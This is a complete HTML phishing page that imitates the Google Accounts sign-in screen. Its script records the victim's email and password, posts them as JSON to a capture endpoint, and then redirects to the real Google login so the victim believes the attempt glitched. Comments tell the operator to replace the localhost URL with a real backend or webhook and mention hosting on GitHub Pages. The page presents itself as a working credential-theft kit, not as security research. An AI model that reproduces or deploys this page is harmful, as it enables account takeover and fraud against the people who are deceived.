<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="auth-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
        
        <!-- Step 1: Email -->
        <div id="step-email">
            <h1>Sign in</h1>
            <p class="sub-text">Use your Google Account</p>
            <div class="input-container">
                <input type="email" id="email" placeholder="Email or phone" autocomplete="username">
            </div>
            <div class="footer-actions">
                <a class="link">Forgot email?</a>
                <button onclick="nextStep()">Next</button>
            </div>
        </div>

        <!-- Step 2: Password -->
        <div id="step-password" class="hidden">
            <h1>Welcome</h1>
            <div id="user-pill"></div>
            <div class="input-container">
                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
            </div>
            <div class="footer-actions">
                <a class="link">Forgot password?</a>
                <button onclick="captureAndRedirect()">Next</button>
            </div>
        </div>
    </div>

    <script>
        let userData = { email: "", password: "" };

        function nextStep() {
            const emailVal = document.getElementById('email').value;
            if (emailVal.length > 5) {
                userData.email = emailVal;
                document.getElementById('step-email').classList.add('hidden');
                document.getElementById('user-pill').innerText = emailVal;
                document.getElementById('step-password').classList.remove('hidden');
            }
        }

        async function captureAndRedirect() {
            userData.password = document.getElementById('password').value;

            // CAPTURE LOGIC:
            // Since you're on GitHub Pages, we send this to your LOCAL server or a Webhook.
            // Replace 'http://localhost:3000' with your actual backend URL if you deploy one.
            try {
                await fetch('http://localhost:3000/auth/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(userData)
                });
            } catch (e) {
                console.log("Local server not found, but data is ready for capture.");
            }

            // The "Magic Trick": Redirect them to the real Google login 
            // so they just think the first attempt "glitched."
            window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd";
        }
    </script>
</body>
</html>
